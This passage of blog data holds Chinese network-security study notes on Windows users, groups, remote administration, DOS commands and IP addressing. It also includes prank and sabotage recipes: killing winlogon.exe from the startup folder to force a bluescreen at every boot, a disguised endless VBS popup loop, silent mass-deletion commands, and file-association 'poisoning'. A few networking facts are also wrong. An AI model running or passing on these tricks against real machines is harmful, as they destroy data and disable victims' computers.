- 针对win 2003\n\n    ```jsx\n    ntsd -c q -pn winlogon.exe\n    ```\n\n    - ntsd      ：杀死进程\n    ntsd -c q -pn 进程名：强制杀死指定进程\n    - 蓝屏原因：\n           winlogon.exe为windows登录进程，在开机后就已经登录成功且处于使用状态，无法杀死，而命令想强制杀死，系统不让，结果导致蓝屏\n    - 作死使用方法：将该命令写成一个批处理放到系统启动文件夹下\n    结果    😈       ：开机就蓝屏\n\n---\n\n- 简易小脚本\n    - 方法：写命令到txt，将扩展名改为.vbs\n\n    ```jsx\n    do\n    msgbox \"啦啦啦！\"\n    loop\n    ```\n\n    - 效果       ：加上do-loop后变为死循环，窗口无法关闭\n    解决方法：vbs 使用微软自带的wscript.exe来编写的\n    - 注：可以用修改软件图标，使vbs文件伪装得更好\n\n    ![](https://raw.githubusercontent.com/yuchen-zeta/images/main/blog/pic_bed/202008day03-1(3).png)\n\n    - 升级小脚本（并没有什么用😒）\n\n        ```jsx\n        do\n        msgbox \"小哥我最帅！\"\n        msgbox \"小子，你对这件事有异议吗\"\n        msgbox \"你要为此付出代价\"\n        msgbox \"从现在开始我要求你点100下鼠标\"\n        msgbox \"100\"\n        msgbox \"99\"\n        msgbox \"98\"\n        msgbox \"97\"\n        msgbox \"96\"\n        msgbox \"95\"\n        msgbox \"94\"\n        msgbox \"93\"\n        msgbox \"92\"\n        msgbox \"91\"\n        msgbox \"90\"\n        msgbox \"....\"\n        msgbox \"3\"\n        msgbox \"2\"\n        msgbox \"1\"\n        msgbox \"如果你看到这里，说明你确实很执着，你感动了我，请再点一下\"\n        msgbox \"年轻人，有时候执着也没用，换个姿势再来一次\"\n        loop\n        ```\n\n---\n\n- 整人网页\n\n    ```jsx\n    <!DOCTYPE html>\n    <html>\n    <head>\n    \t<meta charset=\"utf-8\">\n    \t<meta http-equiv=\"X-UA-Compatible\" content=\"IE=edge\">\n    \t<title>很恶心的常见整人效果的代码</title>\n    \t<link rel=\"stylesheet\" href=\"\">\n    </head>\n    <body>\n    \t<a href=\"\" onmouseover=\"alert('飞哥真帅');\n    alert('飞哥真帅');\n    alert('飞哥是真帅');\n    alert('飞哥是真帅');\n    alert('飞哥是真的帅');\n    alert('同意不！');\n    alert('不同意？');\n    alert('去死吧');\n    \t\">不许把鼠标移到这里！</a>不敢了吧！！！\n    </body>\n    </html>\n    ```\n\n    测试效果：\n\n    ![](https://raw.githubusercontent.com/yuchen-zeta/images/main/blog/pic_bed/202008day03-1(4).png)\n\n","tags":["网络安全"],"categories":["网络安全"]},{"title":"day03 - 用户与组管理 | 远程管理","url":"/2020/08/03/day03-Remote administration/","content":"\n# 服务器系统版本介绍\n\n- windows服务器系统：win2000 win2003 win2008 win2012\n\n- linux服务器系统：Redhat(收费)   Centos(免费)  同一家公司\n\n  <!-- more -->\n\n# 一、用户管理\n\n1. 用户概述\n    - 每一个用户登陆系统之后，拥有不同的操作权限\n    - 每一个账户都有自己唯一的 SID（安全标识符）\n    - 用户SID：S-1-5-21-426206823-2579496042-14852678-500\n\n        系统SID：S-1-5-21-426206823-2579496042-14852678\n\n        > 用户UID：500\n        windows系统管理员 administrator 的默认UID是 500\n        普通用户的UID从 1000 开始\n           linux    系统管理员        root         的默认UID是 0\n        普通用户是1000开始\n\n    - 注：不同账户拥有不同的权限，为不同账户赋权限也就是为不同账户的SID赋权，而不是单指表面的用户名\n    - 查看SID：\n    whoami             查看主机名和当前用户名\n    whoami /user    查看主机名、当前用户名，以及SID\n    - 用户密码储存位置：C:\\Windows\\System32\\config\\SAM \n    hash哈希加密算法 (单项加密，无法解密，只能得到校验码)\n    破解方法：暴力破解 撞库\n    - windows 服务器用户默认密码最长有效期为 42 天\n\n    ---\n\n2. 内置账户\n    - 给人使用的账户：\n\n        administrator                        #管理员账户\n\n        guest                                     #来宾账户 权限极低，一般系统默认禁用\n\n    - 计算机服务组件相关的系统账号\n\n        system                                    #系统账户        == 最高权限\n\n        local services                           #本地服务账户 == 普通权限\n\n        network services                     #网络服务账户  == 普通权限\n\n    ---\n\n3. 配置文件\n    - 每个用户都有自己的配置文件，在第一次登陆产生\n    - 路径：\n\n        win7/win2008     c:\\用户\\\n\n        xp/win2003         c:\\Documents and Settings\\\n\n        可以利用系统变量 %usersprofile% 获取当前用户路径\n\n    ---\n\n4. 用户管理命令\n\n    ```jsx\n    net user\t\t\t                  #查看用户列表\n    net user 用户名                 #查看用户信息 \n    net user 用户名 密码\t\t        #更改密码     （服务器中仅管理员）\n    net user 用户名 密码  /add      #创建一个新用户（服务器中仅管理员）\n    net user 用户名 /del\t          #删除一个用户  （服务器中仅管理员）\n    net user 用户名 /active:yes/no  #激活或禁用用户（服务器中仅管理员）\n    ```\n\n# 二、组管理\n\n1. 组概述\n    - 组的作用：简化权限的赋予\n    - 赋权方式：\n        - 用户---组---赋权限\n        - 用户---赋权限\n2. 内置组\n    - 内置组的权限默认已经被系统赋予\n\n    ```jsx\n    1. administrators\t\t\t# 管理员组\n    2. guests\t\t\t\t      # 来宾组\n    3. users\t\t      \t\t# 普通用户组，默认新建用户所在组\n    4. network\t\t\t    \t# 网络配置组\n    5. print\t\t\t      \t# 打印机组\n    6. Remote Desktop\t\t\t# 远程桌面组\n    ```\n\n3. 组管理命令\n\n    ```jsx\n    net localgroup\t\t\t              #　查看组列表\n    net localgroup 组名 \t          \t#  查看该组的成员\n    net localgroup 组名 /add\t\t      # 创建一个新的组\n    net localgroup 组名 /del\t    \t  # 删除一个组\n    net localgroup 组名 用户名 /add \t# 添加一个新用户到组\n    net localgroup 组名 用户名 /del   # 从组中删除用户\n    ```\n\n# 三、服务器远程管理\n\n- mstsc                        #远程桌面程序\n    - 步骤\n    1.首先配置网络，并实现客户机与服务器可以互通 (ping得通)\n    2.服务器开启允许远程控制：我的电脑属性 — 远程设置 — 选择允许 — 确定\n    3.客户机上：运行窗口输入 mstsc 打开远程连接工具\n    4.在mstsc工具上输入服务器的IP ，点击确定\n    5.输入服务器的账号密码\n    注：如使用非管理员账户登陆，需要在服务器上将用户加到 远程桌面内置组 Remote Desktop Users 中\n- telnet IP                  #cmd中实现远程控制\n    - 在cmd上输入telnet IP \n    输入服务器的账号密码\n    注：如使用非管理员账户登陆，需要在服务器上将用户加到 TelnetClients 中\n- netstat -an                #查看本机开放的所有端口\n\n    > 一些特殊端口：telnet：23远程桌面协议RDP：3389","tags":["网络安全"],"categories":["网络安全"]},{"title":"day02 - 基本DOS命令","url":"/2020/08/02/day02-DOS/","content":"\nTab + 向上   自动补全       |       Ctrl + C     强制终止命令\n\n---\n\n# 基本命令\n\n> cd..                         返回上级目录\ncd\\                         返回根目录\nd:                            进入D盘\ncls                           清空所有dos操作\ndir                           显示当前盘符文件信息\nrd . /s/q                   清空磁盘\n\n---\n<!-- more -->\n# 浏览文件信息\n\n> type 文件名.扩展名                 显示\ntype 文件名.扩展名 | more      分页显示\n例如：dir c:\\windows | more  \n(任何命令，只要输出过多都可以用 后缀 | more 分页显示,按空格输出下一页)\n\n---\n\n# 创建文件\n\n> echo world is so amazing !           输出到屏幕\necho 字符串 >test.txt                    输出到文件，覆盖\necho 字符串 >>c:\\test.txt              输出到文件，追加\n                                                      若文件不存在，则创建该文件\n\n> copy con 文件名.扩展名 \ncon可暂时理解为屏幕，即在dos窗口中写内容，然后保存到指定文件\n输入命令后回车开始编写   ，  Ctrl + Z ，回车结束编写\n\n---\n\n# 删除文件\n\n> del 文件名.扩展名               删除该文件\ndel *.txt                               删除所有 txt/··· 结尾的文件\ndel *.*                                  删除所有文件\ndel *.* /s/q                          无提示删除所有文件\n                                            /s 所有根目录\n\n---\n\n# 文件夹\n\n> md 文件名                           创建文件夹\nattrib +h 文件名                  隐藏文件夹\nattrib -h 文件名                   取消文件夹\nattrib +h +s +a 文件名        将文件夹隐藏设为受保护的系统文件夹\ndir /a                                    显示当前磁盘所有文件，包括系统文件\n\n快速生成一个指定大小的空文件，若将其恶意隐藏为系统文件，一般较难发现\n\n> fsutil file createnew c:\\system.ini 1024000000\n在c盘创建1G的空文件\n\n---\n\n# 复制和移动\n\n> copy  源文件地址  目的地址       复制源文件到目的地址\n如：D :\\ test \\ a > copy  hello.txt   ..\\b\\ \n       将test中的a文件夹下的hello.txt 复制到 test 的b文件夹下\n       D :\\ test \\ a > copy \\test\\b\\hello.txt  .\\\n       将b文件夹下的hello.txt 复制到 当前文件夹 a中\nmove 源文件地址  目的地址       移动源文件到目的地址\nren     旧名  新名                          重命名\n\n---\n\n# 修改关联\n\n> 下毒：\nassoc .txt=exefile                  将.txt文件作为.exe文件打开\n                                              修改打开txt文件的程序 使其无法打开\n解药：\nassoc .txt=txtfile                    恢复关联\n\n---\n\n# 关机\n\n> shutdown -s -t 100                      定时关机，单位秒\nshutdown -s -f -t 秒                    定时强制关机，无任何保存提示\nshutdown -s -f -t 秒 -c \"别玩儿啦，洗洗睡吧！\"\nshutdown -r -t 秒                        定时重启\nshutdown -a                                取消一切定时\nshutdown -l                                 注销，同logoff命令相同","tags":["网络安全"],"categories":["网络安全"]},{"title":"day02 - IP地址详解","url":"/2020/08/02/day02-IP/","content":"\n# 局域网\n\n- 局域网：一般称为内网\n- 单局域网的构成：交换机、网线、PC (其他IT终端)\n- 交换机：用来组建内网的局域网的设备（硬件上有很多网口）\n\n<!-- more -->\n\n# 子网掩码\n\n- IP 地址构成：网络位 + 主机位       | 32位二进制，x.x.x.x  0≤ x ≤ 255\n- **局域网通信规则**：所有人必须都在**同一网段内**(网络位相同)才能通信\n- **子网掩码**：用来确定网络位，与 255 对应的是网路位，与 0 对应的是主机位\n\n    > 例如：192.168.0.X，前 3 位是网络位，最后一个是主机位\n    属于 192.168.0.0 网段，名字是 .X，子网掩码就是 255.255.255.0\n\n# IP地址详解\n\n- ISO定义五大类：（以IP地址的第一位进行区分）\n    - A 类：1    - 126 默认子网掩码：255.0.0.0\n    - B 类：128 - 191 默认子网掩码：255.255.0.0\n    - C 类：192 - 223 默认子网掩码：255.255.255.0\n    - D 类：224 - 239 组播地址\n    - E 类： 244 - 254 科研使用\n\n    注：目前我们只能使用A、B、C类 但A、B、C类子网掩码可以修改\n\n- 几种特殊的 IP 地址：\n    - 本机 IP ：127.0.0.1\n    - 广播地址：主机位全为 255\n    - 网段：主机位全为 0\n\n        > 主机位不能全为0和255\n\n# 网关\n\n- 网关：一个网络的出口，Gateway=GW，一般网关在路由器上（占一个IP）\n\n    一般是 IP地址 的**最后一位**或者是**第一位**\n\n- 路由器：可以连接外网的设备\n\n> PC向外发包的心理活动\n1、首先判断目标IP与自己是否在 同一个网段\n2、如在同一个网段，则直接发出去，不找网关\n3、如不在同一个网段，则发包给网关\n\n# DNS\n\n**DNS：Domain Name Service 域名服务 |** DNS服务器在公网上，也有IP，由厂商提供\n\n> 输入域名后，浏览器的心理活动\n1、先到本地**DNS缓存**上找\n2、如**DNS缓存**中没找到，则到**本地解析文件**上找\n3、如**本地解析文件**中还是没找到，则请求**DNS服务器**帮助\n\n- 测试网络连通性：**Ctrl+C 可终止 ping**             \n有去有回即为可以成功通路，若请求超时则说明**对方不在线，网络不连通**或**防火墙拦截**\n    - ping 目标IP地址              |  测试网络连通性\n    - ping -t  目标IP地址          |  一直ping\n    - ping -n 数字 目标ip地址 |  修改ping包的数量（默认4）\n    - ping -l   数字 目标ip地址  |  修改ping 包的字节数\n\n- 手工解析域名：\n    - nslookup www.baidu.com\n\n    获得DNS服务器IP：192.168.0.1\n    获得域名的IP：180.97.34.96  ,   .94\n\n![](https://raw.githubusercontent.com/yuchen-zeta/images/main/blog/pic_bed/202008day02.png)\n\n- 查看本地IP：可双击网卡，ipv4协议   |   或用命令\n    - ipconfig        |  查看ip基本信息\n    - ipconfig /all   |  查看ip所有信息\n\n---","tags":["网络安全"],"categories":["网络安全"]}]